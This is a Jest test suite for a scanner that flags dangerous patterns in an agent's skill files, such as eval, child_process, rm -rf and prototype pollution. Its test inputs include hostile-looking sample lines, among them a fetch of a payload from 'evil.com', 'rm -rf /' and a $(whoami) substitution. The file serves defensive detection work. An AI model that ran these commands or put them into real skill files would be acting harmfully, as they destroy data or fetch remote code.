import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import {
  scanFile,
  scanDirectory,
  scanAllSkills,
  formatScanReport,
  ScanResult,
  ScanFinding,
} from '../../src/security/skill-scanner.js';

// Create a temp directory for test files
let tmpDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'skill-scanner-test-'));
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

/**
 * Helper: write a file and return its path
 */
function writeTestFile(filename: string, content: string): string {
  const filePath = path.join(tmpDir, filename);
  const dir = path.dirname(filePath);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  fs.writeFileSync(filePath, content, 'utf-8');
  return filePath;
}

// ==========================================================================
// scanFile - Detection of dangerous patterns
// ==========================================================================

describe('scanFile', () => {
  // ---- Code execution patterns (critical/high) ----

  it('should detect eval() as critical', () => {
    const fp = writeTestFile('test.skill.md', 'const result = eval("code");');
    const result = scanFile(fp);
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    const evalFinding = result.findings.find(f => f.pattern === 'eval');
    expect(evalFinding).toBeDefined();
    expect(evalFinding!.severity).toBe('critical');
  });

  it('should detect new Function() as critical', () => {
    const fp = writeTestFile('test.skill.md', 'const fn = new Function("return 1");');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'new-function');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('critical');
  });

  it('should detect child_process import as high', () => {
    const fp = writeTestFile('test.ts', "import { exec } from 'child_process';");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'child_process');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect execSync() as high', () => {
    const fp = writeTestFile('test.ts', "execSync('rm -rf /tmp');");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'execSync');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect execFile() as high', () => {
    const fp = writeTestFile('test.ts', "execFile('/usr/bin/node', ['script.js']);");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'execFile');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect exec() as high', () => {
    const fp = writeTestFile('test.ts', "exec('ls -la');");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'exec');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect spawn() as medium', () => {
    const fp = writeTestFile('test.ts', "spawn('node', ['server.js']);");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'spawn');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  // ---- File system dangers ----

  it('should detect rm -rf as critical', () => {
    const fp = writeTestFile('test.skill.md', 'Run: rm -rf /tmp/build');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'rm-rf');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('critical');
  });

  it('should detect unlinkSync as medium', () => {
    const fp = writeTestFile('test.ts', "fs.unlinkSync('/path/to/file');");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'unlinkSync');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  it('should detect writeFileSync as low', () => {
    const fp = writeTestFile('test.ts', "fs.writeFileSync('output.txt', data);");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'writeFileSync');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('low');
  });

  it('should detect rmdirSync as medium', () => {
    const fp = writeTestFile('test.ts', "fs.rmdirSync('/tmp/dir');");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'rmdirSync');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  // ---- Network patterns ----

  it('should detect fetch with HTTP URL as medium', () => {
    const fp = writeTestFile('test.skill.md', "fetch('http://evil.com/payload')");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'fetch-http');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  it('should detect axios usage as low', () => {
    const fp = writeTestFile('test.ts', "import axios from 'axios';");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'axios');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('low');
  });

  it('should detect require("http") as medium', () => {
    const fp = writeTestFile('test.ts', "const http = require('http');");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'http-require');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  it('should detect WebSocket as medium', () => {
    const fp = writeTestFile('test.ts', "const ws = new WebSocket('ws://localhost');");
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'websocket');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  // ---- Dynamic imports ----

  it('should detect dynamic require() with variable as high', () => {
    const fp = writeTestFile('test.ts', 'const mod = require(moduleName);');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'dynamic-require');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect dynamic import() with variable as high', () => {
    const fp = writeTestFile('test.ts', 'const mod = await import(modulePath);');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'dynamic-import');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  // ---- Environment/secrets ----

  it('should detect dynamic process.env access as low', () => {
    const fp = writeTestFile('test.ts', 'const val = process.env[key];');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'env-dynamic');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('low');
  });

  it('should detect secret references as info', () => {
    const fp = writeTestFile('test.skill.md', 'Set your API_KEY in the config.');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'secret-ref');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('info');
  });

  it('should detect PASSWORD references as info', () => {
    const fp = writeTestFile('test.skill.md', 'Enter your PASSWORD here');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'secret-ref');
    expect(finding).toBeDefined();
  });

  // ---- Prototype pollution ----

  it('should detect __proto__ as high', () => {
    const fp = writeTestFile('test.ts', 'obj.__proto__.pollute = true;');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'proto');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect constructor bracket access as high', () => {
    const fp = writeTestFile('test.ts', 'obj.constructor["prototype"]');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'constructor-bracket');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  // ---- Shell injection patterns ----

  it('should detect template literal interpolation as medium', () => {
    // The pattern requires backtick immediately followed by ${...} then backtick
    const content = 'const cmd = `${userInput}`;';
    const fp = writeTestFile('test.ts', content);
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'template-injection');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  it('should detect $() shell command substitution as medium', () => {
    const fp = writeTestFile('test.skill.md', 'Run: echo $(whoami)');
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'shell-subst');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  // ---- Safe files ----

  it('should produce no findings for a safe skill file', () => {
    const fp = writeTestFile('safe.skill.md', [
      '---',
      'name: safe-skill',
      'version: 1.0.0',
      '---',
      '',
      '# Safe Skill',
      '',
      'This skill just prints hello world.',
      '',
      '## Steps',
      '',
      '1. Print "Hello, World!"',
      '2. Done.',
    ].join('\n'));
    const result = scanFile(fp);
    expect(result.findings).toHaveLength(0);
  });

  it('should produce no findings for a markdown-only file', () => {
    const fp = writeTestFile('readme.skill.md', [
      '# My Skill',
      '',
      '## Description',
      '',
      'A skill that does nothing dangerous.',
      '',
      '- Step 1: Read the file',
      '- Step 2: Process the content',
      '- Step 3: Output the result',
    ].join('\n'));
    const result = scanFile(fp);
    expect(result.findings).toHaveLength(0);
  });

  // ---- Edge cases ----

  it('should skip HTML comment lines', () => {
    const fp = writeTestFile('test.skill.md', '<!-- eval("safe comment") -->');
    const result = scanFile(fp);
    // The line starting with <!-- should be skipped
    expect(result.findings).toHaveLength(0);
  });

  it('should skip YAML frontmatter delimiter lines', () => {
    const fp = writeTestFile('test.skill.md', '---');
    const result = scanFile(fp);
    expect(result.findings).toHaveLength(0);
  });

  it('should NOT skip patterns that happen to be in non-comment lines', () => {
    // Even if a pattern looks innocuous, if it's on a regular line it gets flagged
    const fp = writeTestFile('test.skill.md', [
      '# Skill',
      '',
      'Run this: eval("doStuff()")',
    ].join('\n'));
    const result = scanFile(fp);
    const evalFinding = result.findings.find(f => f.pattern === 'eval');
    expect(evalFinding).toBeDefined();
  });

  it('should include correct line numbers in findings', () => {
    const fp = writeTestFile('test.ts', [
      'const a = 1;',
      'const b = 2;',
      'eval("dangerous");',
      'const c = 3;',
    ].join('\n'));
    const result = scanFile(fp);
    const evalFinding = result.findings.find(f => f.pattern === 'eval');
    expect(evalFinding).toBeDefined();
    expect(evalFinding!.line).toBe(3);
  });

  it('should include the file path in findings', () => {
    const fp = writeTestFile('myskill.skill.md', 'eval("bad")');
    const result = scanFile(fp);
    expect(result.file).toBe(fp);
    expect(result.findings[0].file).toBe(fp);
  });

  it('should truncate long evidence lines to 120 chars', () => {
    const longLine = 'eval(' + 'x'.repeat(200) + ')';
    const fp = writeTestFile('test.ts', longLine);
    const result = scanFile(fp);
    const finding = result.findings.find(f => f.pattern === 'eval');
    expect(finding).toBeDefined();
    expect(finding!.evidence.length).toBeLessThanOrEqual(120);
  });

  it('should handle non-existent files gracefully', () => {
    const result = scanFile('/nonexistent/file.ts');
    expect(result.findings).toHaveLength(0);
    expect(result.file).toBe('/nonexistent/file.ts');
  });

  it('should include a scannedAt timestamp', () => {
    const before = Date.now();
    const fp = writeTestFile('test.ts', 'const x = 1;');
    const result = scanFile(fp);
    const after = Date.now();
    expect(result.scannedAt).toBeGreaterThanOrEqual(before);
    expect(result.scannedAt).toBeLessThanOrEqual(after);
  });

  it('should detect multiple patterns on the same line', () => {
    const fp = writeTestFile('test.ts', "eval(exec('rm -rf /'))");
    const result = scanFile(fp);
    const patterns = result.findings.map(f => f.pattern);
    expect(patterns).toContain('eval');
    expect(patterns).toContain('exec');
    expect(patterns).toContain('rm-rf');
  });

  it('should detect multiple findings across different lines', () => {
    const fp = writeTestFile('test.ts', [
      "import { exec } from 'child_process';",
      "eval('code');",
      "const ws = new WebSocket('ws://localhost');",
    ].join('\n'));
    const result = scanFile(fp);
    expect(result.findings.length).toBeGreaterThanOrEqual(3);
  });

  // ---- Severity levels ----

  it('should correctly assign all severity levels', () => {
    const fp = writeTestFile('test.ts', [
      'eval("critical");',                    // critical
      "require('child_process');",             // high
      "spawn('ls');",                          // medium
      "fs.writeFileSync('f', 'data');",        // low
      'const TOKEN = "abc";',                  // info
    ].join('\n'));
    const result = scanFile(fp);
    const severities = new Set(result.findings.map(f => f.severity));
    expect(severities.has('critical')).toBe(true);
    expect(severities.has('high')).toBe(true);
    expect(severities.has('medium')).toBe(true);
    expect(severities.has('low')).toBe(true);
    expect(severities.has('info')).toBe(true);
  });
});

// ==========================================================================
// scanDirectory
// ==========================================================================

describe('scanDirectory', () => {
  it('should return empty array for non-existent directory', () => {
    const result = scanDirectory('/definitely/not/a/real/dir');
    expect(result).toEqual([]);
  });

  it('should scan .skill.md files in directory', () => {
    writeTestFile('skills/dangerous.skill.md', 'eval("bad")');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(1);
    expect(results[0].findings.length).toBeGreaterThan(0);
  });

  it('should scan SKILL.md files', () => {
    writeTestFile('skills/SKILL.md', 'eval("bad")');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(1);
  });

  it('should scan .ts files', () => {
    writeTestFile('skills/helper.ts', 'eval("bad")');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(1);
  });

  it('should scan .js files', () => {
    writeTestFile('skills/helper.js', 'eval("bad")');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(1);
  });

  it('should NOT scan unrelated file types', () => {
    writeTestFile('skills/readme.txt', 'eval("bad")');
    writeTestFile('skills/data.json', '{"eval": "bad"}');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(0);
  });

  it('should scan subdirectories recursively', () => {
    writeTestFile('skills/sub/deep/danger.skill.md', 'eval("bad")');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(1);
  });

  it('should only include files with findings', () => {
    writeTestFile('skills/safe.skill.md', '# Safe skill\nJust text.');
    writeTestFile('skills/dangerous.skill.md', 'eval("bad")');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(1);
    expect(results[0].file).toContain('dangerous.skill.md');
  });

  it('should return multiple results for multiple dangerous files', () => {
    writeTestFile('skills/a.skill.md', 'eval("bad1")');
    writeTestFile('skills/b.skill.md', 'eval("bad2")');
    writeTestFile('skills/c.ts', 'eval("bad3")');
    const results = scanDirectory(path.join(tmpDir, 'skills'));
    expect(results).toHaveLength(3);
  });
});

// ==========================================================================
// scanAllSkills
// ==========================================================================

describe('scanAllSkills', () => {
  it('should scan bundled, managed, and workspace skill directories', () => {
    // Create the three skill directories
    writeTestFile('.codebuddy/skills/bundled/a.skill.md', 'eval("bundled")');
    writeTestFile('.codebuddy/skills/managed/b.skill.md', 'eval("managed")');
    writeTestFile('.codebuddy/skills/workspace/c.skill.md', 'eval("workspace")');

    const results = scanAllSkills(tmpDir);
    expect(results).toHaveLength(3);
  });

  it('should return empty when no skill directories exist', () => {
    const results = scanAllSkills(tmpDir);
    expect(results).toEqual([]);
  });

  it('should handle partial skill directories (only bundled exists)', () => {
    writeTestFile('.codebuddy/skills/bundled/danger.skill.md', 'eval("bad")');
    const results = scanAllSkills(tmpDir);
    expect(results).toHaveLength(1);
  });
});

// ==========================================================================
// formatScanReport
// ==========================================================================

describe('formatScanReport', () => {
  it('should report no issues for empty results', () => {
    const report = formatScanReport([]);
    expect(report).toContain('No security issues found');
  });

  it('should include total finding count', () => {
    const fp = writeTestFile('test.skill.md', "eval('bad');\nexec('cmd');");
    const results = [scanFile(fp)];
    const report = formatScanReport(results);
    expect(report).toContain('findings');
    expect(report).toContain('file');
  });

  it('should include severity breakdown', () => {
    const fp = writeTestFile('test.ts', [
      'eval("critical");',
      "spawn('medium');",
      "fs.writeFileSync('low', 'data');",
    ].join('\n'));
    const results = [scanFile(fp)];
    const report = formatScanReport(results);
    expect(report).toContain('Critical');
    expect(report).toContain('Medium');
    expect(report).toContain('Low');
  });

  it('should include file name', () => {
    const fp = writeTestFile('my-dangerous-skill.skill.md', 'eval("bad")');
    const results = [scanFile(fp)];
    const report = formatScanReport(results);
    expect(report).toContain('my-dangerous-skill.skill.md');
  });

  it('should include line numbers', () => {
    const fp = writeTestFile('test.ts', 'const x = 1;\neval("line2");');
    const results = [scanFile(fp)];
    const report = formatScanReport(results);
    expect(report).toContain('L2');
  });

  it('should include evidence strings', () => {
    const fp = writeTestFile('test.ts', 'eval("unique_marker_string")');
    const results = [scanFile(fp)];
    const report = formatScanReport(results);
    expect(report).toContain('unique_marker_string');
  });

  it('should include descriptions', () => {
    const fp = writeTestFile('test.ts', 'eval("bad")');
    const results = [scanFile(fp)];
    const report = formatScanReport(results);
    expect(report).toContain('Dynamic code execution');
  });
});
